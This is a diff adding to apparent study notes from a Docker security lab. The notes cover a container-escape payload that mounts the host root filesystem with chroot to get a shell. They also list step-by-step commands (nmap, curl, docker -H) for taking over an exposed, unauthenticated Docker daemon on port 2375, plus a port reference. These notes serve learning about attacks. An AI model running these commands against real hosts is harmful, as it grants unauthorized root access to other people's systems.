@@ -44,4 +44,24 @@ attack payload ->  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
                   chroot to change the root directory of the container to be /mnt: chroot /mnt
                    container to run sh to gain a shell and execute commands in the container: sh
 
+**Remote Code Execution via Exposed Docker Daemon
+
+Docker Engine will listen on a port when configured to be run remotely. 
+vulnerability here is Docker is remotely accessible and allows anyone to execute commands
+
+         steps to repeate 
+                           -> findout if docker is running remotely //nmap -sV -p 2375 IP
+                           ->  use the curl command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker
+                               //curl http://10.10.145.226:2375/version
+                           ->  docker -H tcp://10.10.145.226:2375 ps to execute arbitary commands 
+
+
+         2375: unencrypted docker socket, remote root passwordless access to the host
+         2376: tls encrypted socket, most likely this is your CI servers 4243 port as a modification of the https 443 port
+         2377: swarm mode socket, for swarm managers, not for docker clients
+         5000: docker registry service
+         4789 and 7946: overlay networking
+         Only the first two are set with dockerd -H, swarm mode can be configured as part of docker swarm init --listen-addr or docker swarm join --listen-addr.
+
+
 
